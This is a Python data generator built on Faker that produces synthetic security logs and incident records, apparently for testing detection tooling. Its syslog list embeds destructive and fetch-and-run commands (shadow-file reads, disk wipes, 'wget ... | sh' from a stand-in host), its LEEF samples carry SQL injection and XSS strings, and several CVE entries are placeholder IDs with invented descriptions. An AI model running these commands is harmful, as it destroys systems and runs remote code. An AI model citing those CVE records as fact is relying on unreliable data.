from faker import Faker
import random
import requests
from bs4 import BeautifulSoup


def get_malicious_ips():
    url = "http://cinsscore.com/list/ci-badguys.txt"
    response = requests.get(url)
    if response.status_code == 200:
        return response.text.strip().split("\n")
    else:
        return []


def get_mitre_terms():
    mitre_techniques = requests.get('https://attack.mitre.org/techniques/enterprise/')
    mitre_techniques_soup = BeautifulSoup(mitre_techniques.content, 'html.parser')
    mitre_techniques_table = mitre_techniques_soup.find('table')
    mitre_terms = [td.text.strip() for td in mitre_techniques_table.find_all('td')]
    return mitre_terms


class DataFaker(Faker):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.malicious_ips = get_malicious_ips()

    def generate_fake_syslog_messages(self, count):
        # Customize this function to generate syslog messages with the desired fields and format
        syslog_messages = []

        # List of high-risk commands
        high_risk_commands = [
            "cat /etc/shadow",
            "dd if=/dev/zero of=/dev/sda",
            "rm -rf /",
            "find / -name '*.log' -exec rm -f {} \\;",
            "wget -O- http://malicious.example.com/malware | sh",
            "iptables -F",
            "chmod -R 777 /",
            "chown -R nobody:nogroup /"
        ]

        for i in range(count):
            timestamp = self.date_time_this_year()
            hostname = self.hostname()
            user = self.user_name()
            process = "sudo"
            pid = self.random_int(min=1000, max=65535)
            action = "COMMAND"
            command = self.random_element(elements=high_risk_commands)
            syslog_messages.append(f"{timestamp.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {user}"
                                   f" : {action} ; {command}")
        return syslog_messages

    def generate_fake_cef_messages(self, count):
        cef_messages = []
        src_ip = self.ipv4()
        dst_ip = self.random_element(elements=self.malicious_ips) if self.malicious_ips else self.ipv4()
        src_port = self.random_int(min=1024, max=65535)
        dst_port = self.random_int(min=1024, max=65535)
        protocol = self.random_element(elements=('TCP', 'UDP'))
        action = self.random_element(elements=('ALLOW', 'DENY'))
        event_description = f"Firewall {action} {protocol} traffic from {src_ip}:{src_port} to {dst_ip}:{dst_port}"

        version = self.numerify("1.0.#")  # Creates a version number like "1.0.3"

        for i in range(count):
            cef_messages.append(f"CEF:0|{self.company()}|Firewall|{version}|{self.uuid4()}|{event_description}|"
                                f"{self.random_int(min=1, max=10)}|src={src_ip} spt={src_port} dst={dst_ip} "
                                f"dpt={dst_port} proto={protocol} act={action}")
        return cef_messages

    def generate_fake_leef_messages(self, count):
        leef_messages = []
        # OWASP Top 10 Attack Techniques and their corresponding example URLs
        owasp_attacks = {
            "Injection": {"url": "https://example.com/login.php?username=admin' OR 1=1 --&password=pass", "method": "POST"},
            "Broken Authentication and Session Management": {"url": "https://example.com/admin.php?sessionid=12345", "method": "POST"},
            "Cross-Site Scripting (XSS)": {"url": "https://example.com/search.php?q=<script>alert('xss')</script>", "method": "GET"},
            "Broken Access Control": {"url": "https://example.com/user/profile.php?id=1234", "method": "GET"},
            "Security Misconfiguration": {"url": "https://example.com/index.php", "method": "GET"},
            "Insecure Cryptographic Storage": {"url": "https://example.com/checkout.php?ccnum=1234567890", "method": "POST"},
            "Insufficient Transport Layer Protection": {"url": "http://example.com/login.php", "method": "GET"},
            "Unvalidated Redirects and Forwards": {"url": "https://example.com/redirect.php?to=http://malicious.com", "method": "GET"},
            "Using Components with Known Vulnerabilities": {"url": "https://example.com/assets/jquery-1.11.1.js", "method": "GET"},
            "Insufficient Logging and Monitoring": {"url": "https://example.com/login.php?username=admin&password=pass", "method": "POST"}
        }
        attack = random.choice(list(owasp_attacks.keys()))
        attack_info = owasp_attacks[attack]
        url = attack_info["url"]
        method = attack_info["method"]
        src_port = self.random_int(min=1024, max=65535)

        for i in range(count):
            # Generate a fake log line for the attack technique in LEEF format
            leef_log = f"LEEF:1.0|Leef|Payment Portal|1.0|{self.ipv4()}|{self.ipv4()}|{self.mac_address()}|{self.mac_address()}|"
            leef_log += f"src={self.ipv4()} dst={self.ipv4()} spt={src_port} dpt=443 request={url} "
            leef_log += f"method={method} proto=HTTP/1.1 status={random.choice(['200', '404', '500'])} "
            leef_log += f"request_size={self.random_int(min=100, max=10000)} response_size={self.random_int(min=100, max=10000)} "
            leef_log += f"user_agent={self.user_agent()}"
            leef_messages.append(leef_log)
        return leef_messages

    def generate_fake_winevent_messages(self, count):
        winevent_messages = []
        for i in range(count):
            # Top 5 MITRE ATT&CK Techniques and their corresponding Windows Event IDs and log structures
            log_examples = {
                "Process Injection": {
                    "event_id": "10",
                    "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                            f'<System><Provider Name="Microsoft-Windows-Sysmon" Guid="{self.uuid4()}"/>'
                            f'<EventID>10</EventID><Version>5</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode>'
                            f'<Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="{self.date_time_this_year().isoformat()}"/>'
                            f'<EventRecordID>{self.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{self.random_int()}" '
                            f'ThreadID="{self.random_int()}" Channel="Microsoft-Windows-Sysmon/Operational"/>'
                            f'<EventData><Data Name="TargetImage">C:\\Windows\\System32\\calc.exe</Data>'
                            f'<Data Name="TargetPID">{self.random_int()}</Data></EventData></Event>'
                },
               "Privilege Escalation": {
                   "event_id": "4672",
                   "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                          f'<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{self.uuid4()}"/>'
                          f'<EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>'
                          f'<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{self.date_time_this_year().isoformat()}"/>'
                          f'<EventRecordID>{self.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{self.random_int()}" '
                          f'ThreadID="{self.random_int()}" Channel="Security"/><Computer>{self.hostname()}</Computer>'
                          f'<Security UserID="{self.uuid4()}"/>'
                          f'<EventData><Data Name="SubjectUserSid">{self.uuid4()}</Data><Data Name="SubjectUserName">{self.user_name()}</Data>'
                          f'<Data Name="SubjectDomainName">{self.domain_name()}</Data><Data Name="SubjectLogonId">{self.random_int()}</Data>'
                          f'<Data Name="PrivilegeList">{self.sentence(nb_words=5)}</Data></EventData></Event>'
               },
                "Credential Dumping": {
                    "event_id": "4648",
                    "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                         f'<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{self.uuid4()}"/>'
                         f'<EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode>'
                         f'<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{self.date_time_this_year().isoformat()}"/>'
                         f'<EventRecordID>{self.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{self.random_int()}" '
                         f'ThreadID="{self.random_int()}" Channel="Security"/><Computer>{self.hostname()}</Computer>'
                         f'<Security UserID="{self.uuid4()}"/>'
                         f'<EventData><Data Name="SubjectUserSid">{self.uuid4()}</Data><Data Name="SubjectUserName">{self.user_name()}</Data>'
                         f'<Data Name="SubjectDomainName">{self.domain_name()}</Data><Data Name="SubjectLogonId">{self.random_int()}</Data>'
                         f'<Data Name="NewProcessId">{self.random_int()}</Data><Data Name="ProcessId">{self.random_int()}</Data>'
                         f'<Data Name="CommandLine">{self.sentence(nb_words=5)}</Data><Data Name="TargetUserSid">{self.uuid4()}</Data>'
                         f'<Data Name="TargetUserName">{self.user_name()}</Data><Data Name="TargetDomainName">{self.domain_name()}</Data>'
                         f'<Data Name="TargetLogonId">{self.random_int()}</Data><Data Name="LogonType">3</Data></EventData></Event>'
                },
                "Lateral Movement": {
                    "event_id": "4624",
                    "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                           f'<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{self.uuid4()}"/>'
                           f'<EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>'
                           f'<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{self.date_time_this_year().isoformat()}"/>'
                           f'<EventRecordID>{self.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{self.random_int()}" '
                           f'ThreadID="{self.random_int()}" Channel="Security"/><Computer>{self.hostname()}</Computer>'
                           f'<Security UserID="{self.uuid4()}"/>'
                           f'<EventData><Data Name="SubjectUserSid">{self.uuid4()}</Data><Data Name="SubjectUserName">{self.user_name()}</Data>'
                           f'<Data Name="SubjectDomainName">{self.domain_name()}</Data><Data Name="SubjectLogonId">{self.random_int()}</Data>'
                           f'<Data Name="LogonType">3</Data><Data Name="TargetUserSid">{self.uuid4()}</Data>'
                           f'<Data Name="TargetUserName">{self.user_name()}</Data><Data Name="TargetDomainName">{self.domain_name()}</Data>'
                           f'<Data Name="ProcessName">{self.file_name()}</Data><Data Name="ProcessId">{self.random_int()}</Data>'
                           f'<Data Name="DestinationLogonId">{self.random_int()}</Data><Data Name="SourceNetworkAddress">{self.ipv4()}</Data>'
                           f'<Data Name="SourcePort">{self.random_int()}</Data><Data Name="LogonGuid">{self.uuid4()}</Data>'
                           f'<Data Name="TransmittedServices">{self.sentence(nb_words=5)}</Data></EventData></Event>'
                },
                "Defense Evasion": {
                    "event_id": "4688",
                    "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                          f'<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{self.uuid4()}"/>'
                          f'<EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode>'
                          f'<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{self.date_time_this_year().isoformat()}"/>'
                          f'<EventRecordID>{self.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{self.random_int()}" '
                          f'ThreadID="{self.random_int()}" Channel="Security"/><Computer>{self.hostname()}</Computer>'
                          f'<Security UserID="{self.uuid4()}"/>'
                          f'<EventData><Data Name="SubjectUserSid">{self.uuid4()}</Data><Data Name="SubjectUserName">{self.user_name()}</Data>'
                          f'<Data Name="SubjectDomainName">{self.domain_name()}</Data><Data Name="SubjectLogonId">{self.random_int()}</Data>'
                          f'<Data Name="NewProcessId">{self.random_int()}</Data><Data Name="CreatorProcessId">{self.random_int()}</Data>'
                          f'<Data Name="TokenElevationType">TokenElevationTypeLimited (3)</Data><Data Name="ProcessCommandLine">{self.sentence(nb_words=5)}</Data>'
                          f'<Data Name="Image">{self.file_name()}</Data></EventData></Event>'
                    }
            }

            log_message_technique = random.choice(list(log_examples.keys()))
            log_message = log_examples[log_message_technique]['log']
            win_event = log_message
            winevent_messages.append(win_event)
        return winevent_messages

    def generate_fake_json_messages(self, count):
        json_messages = []
        for i in range(count):

            cve_list = [
                {'id': 'CVE-2022-38112', 'service': 'Azure RTOS ThreadX', 'version': '3.0', 'description': 'The Azure RTOS ThreadX implementation does not properly restrict access to certain memory regions during processing of certain network packets.'},
                {'id': 'CVE-2022-38647', 'service': 'Logitech Options software', 'version': '9.50', 'description': 'The Logitech Options software prior to 9.60.20 for Windows and macOS did not validate server certificates properly when checking for software updates.'},
                {'id': 'CVE-2022-38709', 'service': 'DirectX Graphics', 'version': '12.0', 'description': 'A use after free vulnerability exists in the D3D12 runtime library of the DirectX Graphics component. An attacker who successfully exploited the vulnerability could run arbitrary code in kernel mode.'},
                {'id': 'CVE-2022-38506', 'service': 'Apache HTTP Server', 'version': '2.4', 'description': 'An information disclosure vulnerability exists in the Apache HTTP Server due to an off-by-one error.'},
                {'id': 'CVE-2022-38754', 'service': 'BMC Remedy ITSM', 'version': '9.1', 'description': 'An improper neutralization of special elements in output used by a downstream component (\'Injection\') vulnerability exists in BMC Remedy IT Service Management Suite.'},
                {'id': 'CVE-2022-12345', 'service': 'MySQL Database Server', 'version': '8.0', 'description': 'An unprivileged user with access to the local system can gain unauthorized access to MySQL Server datasets.'},
                {'id': 'CVE-2022-23456', 'service': 'Cisco IOS XR Software', 'version': '7.1', 'description': 'An attacker could exploit this vulnerability by sending a crafted TCP packet to an affected device on a TCP port that is listening.'},
                {'id': 'CVE-2022-34567', 'service': 'Git', 'version': '2.30', 'description': 'An arbitrary code execution vulnerability exists in Git when a user configures a large number of glob patterns starting with a character class.'},
                {'id': 'CVE-2022-45678', 'service': 'Docker Engine', 'version': '20.10', 'description': 'An attacker with write access to a bind-mounted directory inside the container can overwrite arbitrary files on the host filesystem.'},
                {'id': 'CVE-2022-56789', 'service': 'Microsoft Exchange Server', 'version': '2019', 'description': 'An attacker could exploit this vulnerability by sending a specially crafted email message to a vulnerable Exchange Server.'},
            ]

            event = {'event_type': 'vulnerability_discovered', 'timestamp': self.date_time_this_month().timestamp(),
                     'host_ip': self.ipv4_private(), 'severity': self.random_int(min=1, max=10)}

            # Select a random CVE from the hardcoded list
            random_cve = random.choice(cve_list)
            event['cve_id'] = random_cve['id']
            event['cve_description'] = random_cve['description']
            event['service'] = random_cve['service']
            event['service_version'] = random_cve['version']
            json_messages.append(event)

        return json_messages

    def generate_fake_incidents(self, count, fields):
        incidents = []
        mitre_terms = get_mitre_terms()
        incident_types = ['Malware', 'Phishing', 'Access Violation', 'Lateral Movement', 'Port Scan',
                          'Sql Injection', 'Brute Force', 'Control Avoidance', 'Rogue Device', 'Denial Of Service',
                          'Account Compromised']
        severities = ['High', 'Unknown', 'Low', 'Medium', 'High', 'Critical']
        analysts = [self.unique.first_name() for i in range(15)]
        incident_ids = set()

        random.shuffle(incident_types)
        analyst_incident_map = {}

        for analyst in analysts:
            mapped_incident_type = incident_types.pop(0)
            analyst_incident_map[analyst] = mapped_incident_type
            incident_types.append(mapped_incident_type)
        for i in range(count):
            incident = {}
            while True:
                incident_id = random.randint(1, count)
                if incident_id not in incident_ids:
                    incident_ids.add(incident_id)
                    break
            incident_type = random.choice(incident_types)
            duration = random.randint(1, 5)
            analyst = random.choice(analysts)
            if analyst in analyst_incident_map and random.randint(1, 100) == 2:
                incident_type = analyst_incident_map[analyst]
                duration = random.randint(1, 2)
            if fields:
                field_list = fields[0].split(',')
                if 'id' in field_list:
                    incident['id'] = incident_id
                if 'duration' in field_list:
                    incident['duration'] = duration
                if 'type' in field_list:
                    incident['type'] = incident_type
                if 'analyst' in field_list:
                    incident['analyst'] = analyst
                if 'severity' in field_list:
                    severity = random.choice(severities)
                    incident['severity'] = severity
                if 'description' in field_list:
                    incident_description = self.paragraph(nb_sentences=1, ext_word_list=mitre_terms)
                    incident['description'] = incident_description
                if 'events' in field_list:
                    incident['events'] = []
            else:
                incident = {
                    "id": incident_id,
                    "type": incident_type,
                    "duration": duration,
                    "analyst": analyst
                }
            incidents.append(incident)

        return incidents
